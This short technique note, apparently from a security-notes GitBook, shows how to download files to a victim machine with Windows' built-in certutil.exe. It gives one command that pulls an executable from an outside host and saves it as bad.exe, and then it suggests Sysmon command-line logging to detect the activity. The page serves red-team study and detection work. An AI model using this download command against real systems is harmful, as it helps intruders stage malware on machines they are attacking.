---
description: Downloading additional files to the victim system using native OS binary.
---

# Downloading Files with Certutil

## Downloading Files with Certutil

### Execution

```csharp
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LM8tdi7kX5X8WKb3mtu%2F-LM8yGKxHOpXRAIMdxo9%2Fcertutil-download.gif?alt=media\&token=fa465c97-5eb7-45eb-966c-1879a67dc696)

### Observations

Sysmon commandling logging is a good place to start for monitoring suspicious `certutil.exe` behaviour:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LM8tdi7kX5X8WKb3mtu%2F-LM8z0Y-St784lDrvDbx%2Fcertutil-sysmon.png?alt=media\&token=ec8e4c75-9cb8-4a2e-9883-134a94cb12a5)
